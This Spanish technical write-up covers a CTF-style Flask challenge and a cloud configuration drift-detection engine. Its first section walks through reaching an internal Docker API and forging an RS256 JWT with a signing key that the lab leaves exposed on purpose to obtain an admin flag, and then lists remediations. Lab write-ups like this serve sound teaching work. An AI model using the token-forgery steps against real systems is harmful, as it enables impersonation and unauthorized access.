# Enfoque Técnico — challenge-python

## 1. CTF: Captura de la Flag

### Objetivo
Acceder al endpoint `/admin/flag` en una API Flask corriendo en una red Docker interna sin puertos expuestos.

### Vector de ataque

La API corre en la red `internal` definida en `docker-compose.yml`. Para alcanzarla desde el host se puede ejecutar un contenedor en la misma red:

```bash
docker run --rm --network challenge-python_internal curlimages/curl curl http://app:5000/status
```

O bien usar `docker exec` directamente sobre el contenedor de la app:

```bash
docker exec -it <container_id> sh
```

### Descubrimiento de usuarios

```bash
curl http://app:5000/users
# {"users": ["alice", "bob", "admin"]}
```

### Análisis del código fuente

El endpoint `/admin/flag` (`main.py:70`) decodifica la variable de entorno `CAMPAING`:

```python
valid = base64.b64decode(B64_R[::-1]).decode()
# CAMPAING = "=MWZzRWdvx2Y"
# [::-1]   = "Y2xvdWRzZWM="   (cadena invertida)
# decode   = "cloudsec"        (base64 -> texto)
```

Verifica que:
1. El usuario exista en la BD con `role = "cloudsec"`
2. El claim `role` del JWT sea también `"cloudsec"`

Solo el usuario `bob` tiene `role = "cloudsec"` en la base de datos (`init.sql`).

### Forja del JWT

La clave privada RSA está disponible en el filesystem del contenedor en `/app/keys/private_key.pem` (incluida en la imagen por diseño del challenge).

```python
import jwt
import requests
from cryptography.hazmat.primitives import serialization

with open("app/keys/private_key.pem", "rb") as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

token = jwt.encode(
    {"user": "bob", "role": "cloudsec"},
    private_key,
    algorithm="RS256"
)

resp = requests.get(
    "http://app:5000/admin/flag",
    headers={"Authorization": f"Bearer {token}"}
)
print(resp.json())
```

### Flag capturada

```
FLAG{congrats_you_made_it}
```

### Problemas de seguridad observados

| Problema | Impacto | Recomendación |
|----------|---------|---------------|
| Clave privada RSA en la imagen Docker | Crítico — permite forjar cualquier JWT | Usar montaje de secretos (Docker secrets, AWS Secrets Manager) |
| Credenciales de BD en Base64 | Alto — trivialmente decodificables | Usar variables de entorno cifradas o vault |
| Red interna sin TLS | Medio — tráfico en claro entre contenedores | Mutual TLS o service mesh |
| ~~`str(e)` expuesto en `/users`~~ | Medio — fuga de detalles internos | ✅ Corregido — retorna `"Error al consultar usuarios"` en lugar de detalles internos |
| Sin rate limiting en `/admin/flag` | Medio — permite fuerza bruta de tokens | Implementar `flask-limiter` |
| Variable de entorno con typo `CAMPAING` | Bajo — frágil en mantenimiento | Renombrar a `CAMPAIGN` |
| README con payload incorrecto (`karim/titular`) | Bajo — documentación engañosa | Corregir payload de ejemplo |

---

## 2. Motor de Drift Detection

### Arquitectura

La lógica de comparación está encapsulada en `app/drift_detector.py`, separada de la capa HTTP (`main.py`). Esto permite testear las reglas de negocio sin levantar Flask ni conectarse a la BD.

```
POST /resources/ingest
        │
        ├─ seed_baseline_if_empty()   ← carga data/baseline.json en BD si está vacía
        │
        ├─ upsert resources_current   ← ON CONFLICT DO UPDATE (sin tocar created_at)
        │
        ├─ detect_drifts(baseline, current)   ← drift_detector.py
        │
        └─ DELETE + INSERT drifts     ← replace, no acumulativo
```

### Reglas implementadas

#### Regla 1 — Instance type mismatch (VM)
Detecta cambios en el tipo de instancia de una VM. Un cambio de `t2.micro` a `t2.large` puede representar un escalamiento no autorizado con impacto en costos y superficie de ataque.

- **Severidad**: `High`
- **Ejemplo**: `"Instance type changed from t2.micro to t2.large"`

#### Regla 2 — Security group rule deviation (VM)
Compara las reglas de firewall por tripla `(protocol, port, source)`. Reglas agregadas en `current` que no estaban en `baseline` se marcan como `Critical`; reglas eliminadas como `High`.

- **Regla agregada → Severidad**: `Critical`
- **Regla eliminada → Severidad**: `High`
- **Ejemplo**: `"Security rule added: tcp/22 from 0.0.0.0/0"`

La apertura del puerto 22 (SSH) desde `0.0.0.0/0` es el caso más común de drift crítico de seguridad.

#### Regla 3 — Missing or incorrect tags (todos los tipos)
Verifica que todos los tags definidos en baseline estén presentes en el estado actual con el mismo valor. Tags faltantes o con valor diferente indican pérdida de control sobre la clasificación de recursos.

- **Severidad**: `Medium`
- **Ejemplo**: `"Tag 'owner' missing"`, `"Tag 'environment' changed from 'production' to 'staging'"`

#### Regla 4 — Listener changes (LoadBalancer)
Detecta cambios en los listeners HTTP/HTTPS de un balanceador. Listeners agregados tienen severidad `Low` (puede ser intencional, como agregar HTTPS); listeners eliminados tienen `High` (posible degradación del servicio).

- **Listener agregado → Severidad**: `Low`
- **Listener eliminado → Severidad**: `High`
- **Ejemplo**: `"Listener added: HTTPS/443"`

### Estrategia de persistencia

#### Baseline (fuente de verdad: BD)
La tabla `resources_baseline` es la fuente de verdad. Al primer ingest, si está vacía, se siembra desde `data/baseline.json`. El archivo JSON es solo el seed inicial; las modificaciones posteriores al baseline deben hacerse directamente en la BD.

#### Estado actual (upsert)
`resources_current` usa `ON CONFLICT (resource_id) DO UPDATE SET config=..., type=...`. El campo `created_at` no se actualiza para preservar la semántica de "fecha de primera ingestión".

#### Drifts (replace, no acumulativo)
Cada ingest ejecuta `DELETE FROM drifts WHERE resource_id = %s` antes de insertar los nuevos drifts. Esto garantiza que `GET /drifts/summary` siempre refleje el estado actual, sin inflar conteos con ingestas repetidas del mismo recurso.

---

## 3. Decisiones de Arquitectura

### Separación de módulos
La lógica de drift detection (`drift_detector.py`) está desacoplada de la API (`main.py`). Ventajas:
- Tests unitarios sin necesidad de Flask ni BD
- Reutilizable desde scripts, CLI, o workers asíncronos
- Fácil de extender con nuevas reglas sin tocar el routing

### Configuración vía variables de entorno
Las rutas de archivos sensibles o dependientes del entorno se parametrizan:

| Variable | Defecto (Docker) | Uso local |
|----------|-----------------|-----------|
| `KEY_PATH` | `/app/keys/public_key.pem` | `app/keys/public_key.pem` |
| `BASELINE_PATH` | `/app/data/baseline.json` | `data/baseline.json` |

### Estrategia de tests
Los tests unitarios (`test_configs.py`) no dependen de Flask, BD ni red. Los tests de integración (`test_api.py`) usan un `SmartCursor` mock que simula las respuestas de PostgreSQL por contenido de query, permitiendo correr la suite completa sin Docker.

Cobertura: **34 tests, 0 fallos**.

---

## 4. Mejoras Opcionales Identificadas

- **Redis**: cachear `resources_baseline` para evitar queries repetidos en ingestas de alto volumen
- **CORS**: configurar `flask-cors` para permitir acceso desde frontends
- **Rate limiting**: `flask-limiter` en endpoints sensibles (`/admin/flag`, `/resources/ingest`)
- **Logging estructurado**: reemplazar manejo de excepciones genérico por logging con contexto
- **Paginación**: `GET /drifts` con filtros `?type=VM&severity=Critical&limit=10&offset=0`
- **Mínimo privilegio**: conectar la app como usuario `alice` (permisos restringidos en `init.sql`) en lugar de `admin`